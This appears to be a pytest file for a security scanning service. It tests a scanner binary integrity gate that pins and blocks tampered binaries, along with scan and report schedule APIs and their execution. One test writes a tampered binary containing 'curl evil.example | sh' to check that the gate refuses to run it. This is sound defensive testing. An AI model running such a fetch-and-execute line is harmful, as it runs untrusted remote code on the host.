"""Scanner binary integrity gate, and scan/report schedules."""
import json
import os
import stat

import pytest

from tests.conftest import get_auth_headers, register_user


# ── Scanner binary integrity ─────────────────────────────────────────────────

@pytest.fixture
def fake_scanner(tmp_path, monkeypatch):
    """An executable called 'trivy' on PATH, plus an isolated pin directory."""
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    binary = bin_dir / "trivy"
    binary.write_text("#!/bin/sh\necho trivy 1.0.0\n")
    binary.chmod(binary.stat().st_mode | stat.S_IEXEC)
    monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ['PATH']}")
    return binary, tmp_path / "state"


def _integrity(state_dir, baseline=None):
    from app.services.plugins.integrity import BinaryIntegrity

    return BinaryIntegrity(state_dir=state_dir, baseline_file=baseline or state_dir / "no-baseline.json")


class TestBinaryIntegrity:
    def test_first_use_pins_then_verifies(self, fake_scanner):
        _binary, state = fake_scanner
        integrity = _integrity(state)
        assert integrity.ensure("trivy").status == "pinned"
        assert integrity.ensure("trivy").status == "verified"
        # A second process (API vs worker) reads the same pin
        assert _integrity(state).ensure("trivy").status == "verified"

    def test_changed_binary_is_blocked_until_approved(self, fake_scanner):
        from app.services.plugins.integrity import PluginIntegrityError

        binary, state = fake_scanner
        integrity = _integrity(state)
        integrity.ensure("trivy")

        binary.write_text("#!/bin/sh\ncurl evil.example | sh\n")
        with pytest.raises(PluginIntegrityError, match="was not run"):
            integrity.ensure("trivy")
        assert integrity.check("trivy").status == "mismatch"

        approved = integrity.approve("trivy", approved_by="admin@example.com")
        assert approved.status == "verified"
        assert approved.approved_by == "admin@example.com"
        assert integrity.ensure("trivy").status == "verified"

    def test_image_baseline_is_enforced_on_first_run(self, fake_scanner, tmp_path):
        from app.services.plugins.integrity import PluginIntegrityError, write_baseline

        binary, state = fake_scanner
        baseline = tmp_path / "baseline.json"
        assert "trivy" in write_baseline(baseline)

        assert _integrity(state, baseline).ensure("trivy").status == "verified"
        binary.write_text("#!/bin/sh\necho tampered\n")
        # No first-use pin exists in this state dir, yet the change is caught
        with pytest.raises(PluginIntegrityError):
            _integrity(tmp_path / "fresh-state", baseline).ensure("trivy")

    def test_reading_status_does_not_pin(self, fake_scanner):
        _binary, state = fake_scanner
        integrity = _integrity(state)
        assert integrity.check("trivy", pin_if_new=False).status == "pinned"
        assert not (state / "integrity_pins.json").exists()

    def test_corrupt_pin_file_fails_closed(self, fake_scanner):
        from app.services.plugins.integrity import PluginIntegrityError

        _binary, state = fake_scanner
        state.mkdir()
        (state / "integrity_pins.json").write_text("{not json")
        with pytest.raises(PluginIntegrityError, match="unreadable"):
            _integrity(state).ensure("trivy")

    def test_orchestrator_does_not_run_a_tampered_scanner(self, fake_scanner, monkeypatch):
        from app.services.plugins import integrity as integrity_module
        from app.services.plugins.orchestrator import ScanOrchestrator

        binary, state = fake_scanner
        gate = _integrity(state)
        gate.ensure("trivy")
        monkeypatch.setattr(integrity_module, "_instance", gate)
        binary.write_text("#!/bin/sh\necho tampered\n")

        class Adapter:
            _binary = "trivy"
            ran = False

            def metadata(self):
                return type("M", (), {"requires_binary": True})()

            def scan(self, *args):
                Adapter.ran = True
                return []

        with pytest.raises(integrity_module.PluginIntegrityError):
            ScanOrchestrator._run_single("trivy", Adapter(), "content", "main.tf", {})
        assert Adapter.ran is False


# ── Schedules ────────────────────────────────────────────────────────────────

async def _org_with_repo(client, db_session, email="admin@testcorp.com", org="TestCorp", repo="acme/infra"):
    from app.core.encryption import encrypt_token
    from app.models.integration import Integration

    user = await register_user(client, email=email, org_name=org)
    from tests.conftest import login_user
    token = (await login_user(client, email=email))["access_token"]
    async with db_session as db:
        integration = Integration(
            organization_id=user["organization_id"], vcs_type="github", account_name="acme",
            access_token_encrypted=encrypt_token("ghp_test"), is_active=True,
            repositories=[{"full_name": repo, "enabled": True}, {"full_name": "acme/off", "enabled": False}],
        )
        db.add(integration)
        await db.commit()
        integration_id = integration.id
    return {"Authorization": f"Bearer {token}"}, integration_id, user


class TestScanSchedules:
    @pytest.mark.asyncio
    async def test_create_list_update_delete(self, client, db_session):
        headers, integration_id, _ = await _org_with_repo(client, db_session)
        created = await client.post("/api/v1/scan-schedules", headers=headers, json={
            "name": "Nightly", "integration_id": integration_id, "repository": "acme/infra",
            "cron_expression": "0 2 * * *",
        })
        assert created.status_code == 201, created.text
        body = created.json()
        assert body["repository"] == "acme/infra"
        assert body["next_run_at"], "the next run is known as soon as the schedule exists"

        listed = (await client.get("/api/v1/scan-schedules", headers=headers)).json()
        assert [s["name"] for s in listed] == ["Nightly"]

        paused = await client.put(f"/api/v1/scan-schedules/{body['id']}", headers=headers, json={"enabled": False})
        assert paused.status_code == 200 and paused.json()["enabled"] is False

        assert (await client.delete(f"/api/v1/scan-schedules/{body['id']}", headers=headers)).status_code == 204
        assert (await client.get("/api/v1/scan-schedules", headers=headers)).json() == []

    @pytest.mark.asyncio
    @pytest.mark.parametrize("cron,reason", [
        ("not a cron", "Invalid schedule"),
        ("* * * * *", "every 15 minutes"),
        ("0 2 * *", "Invalid schedule"),
    ])
    async def test_bad_cron_is_rejected(self, client, db_session, cron, reason):
        headers, integration_id, _ = await _org_with_repo(client, db_session)
        resp = await client.post("/api/v1/scan-schedules", headers=headers, json={
            "name": "x", "integration_id": integration_id, "repository": "acme/infra", "cron_expression": cron,
        })
        assert resp.status_code == 400
        assert reason in resp.json()["detail"]

    @pytest.mark.asyncio
    async def test_repository_must_be_enabled(self, client, db_session):
        headers, integration_id, _ = await _org_with_repo(client, db_session)
        resp = await client.post("/api/v1/scan-schedules", headers=headers, json={
            "name": "x", "integration_id": integration_id, "repository": "acme/off",
        })
        assert resp.status_code == 400

    @pytest.mark.asyncio
    async def test_cannot_schedule_another_organizations_integration(self, client, db_session):
        _headers_a, integration_a, _ = await _org_with_repo(client, db_session, "a@corp-a.com", "Corp A")
        headers_b = await get_auth_headers(client, email="b@corp-b.com", org_name="Corp B")
        resp = await client.post("/api/v1/scan-schedules", headers=headers_b, json={
            "name": "steal", "integration_id": integration_a, "repository": "acme/infra",
        })
        assert resp.status_code == 404


class TestScheduleExecution:
    def _db(self, monkeypatch):
        from sqlalchemy import create_engine
        from sqlalchemy.orm import Session
        from app.core.database import Base
        from app.tasks import jobs

        engine = create_engine("sqlite://")
        Base.metadata.create_all(engine)
        monkeypatch.setattr(jobs, "sync_engine", engine)
        queued = []
        monkeypatch.setattr(jobs.run_quick_repo_scan, "delay", lambda **kw: queued.append(kw))
        return Session(engine), queued

    def _seed(self, db, repo_enabled=True, other_org_integration=False):
        from app.models.integration import Integration
        from app.models.organization import Organization
        from app.models.scan_schedule import ScanSchedule

        org, other = Organization(name="A", slug="a"), Organization(name="B", slug="b")
        db.add_all([org, other])
        db.flush()
        integration = Integration(
            organization_id=other.id if other_org_integration else org.id, vcs_type="github",
            account_name="acme", access_token_encrypted="x", is_active=True,
            repositories=[{"full_name": "acme/infra", "enabled": repo_enabled}],
        )
        db.add(integration)
        db.flush()
        sched = ScanSchedule(
            organization_id=org.id, name="Nightly", cron_expression="0 2 * * *",
            config_json={"integration_id": integration.id, "repository": "acme/infra"},
        )
        db.add(sched)
        db.commit()
        return sched

    def test_run_queues_a_scan_and_records_it(self, monkeypatch):
        from app.models.scan import Scan
        from app.tasks import jobs

        db, queued = self._db(monkeypatch)
        sched = self._seed(db)
        result = jobs.run_scan_schedule.run(sched.id)

        assert result["status"] == "queued"
        assert queued and queued[0]["repo_full_name"] == "acme/infra"
        db.expire_all()
        scan = db.get(Scan, result["scan_id"])
        assert scan.scheduled is True and scan.organization_id == sched.organization_id
        assert sched.last_status == "queued" and sched.next_run_at is not None

    @pytest.mark.parametrize("kwargs,expected", [
        ({"repo_enabled": False}, "no longer enabled"),
        ({"other_org_integration": True}, "not active in this organization"),
    ])
    def test_run_refuses_and_says_why(self, monkeypatch, kwargs, expected):
        from app.models.scan import Scan
        from app.tasks import jobs

        db, queued = self._db(monkeypatch)
        sched = self._seed(db, **kwargs)
        result = jobs.run_scan_schedule.run(sched.id)

        assert result["status"] == "failed" and expected in result["error"]
        assert not queued and db.query(Scan).count() == 0
        db.expire_all()
        assert sched.last_status == "failed" and expected in sched.last_error


class TestReportSchedules:
    @pytest.mark.asyncio
    async def test_create_and_validation(self, client):
        headers = await get_auth_headers(client)
        ok = await client.post("/api/v1/report-schedules", headers=headers, json={
            "name": "Weekly", "report_type": "security", "cron_expression": "0 8 * * 1",
            "recipients": ["CISO@Example.com", "ciso@example.com"],
        })
        assert ok.status_code == 201, ok.text
        assert ok.json()["recipients"] == ["ciso@example.com"]
        assert ok.json()["next_run_at"]

        for bad in (
            {"recipients": ["not-an-email"]},
            {"recipients": []},
            {"report_type": "made_up"},
            {"cron_expression": "*/5 * * * *"},
        ):
            payload = {"name": "x", "report_type": "security", "cron_expression": "0 8 * * 1",
                       "recipients": ["a@example.com"], **bad}
            resp = await client.post("/api/v1/report-schedules", headers=headers, json=payload)
            assert resp.status_code == 400, json.dumps(bad)
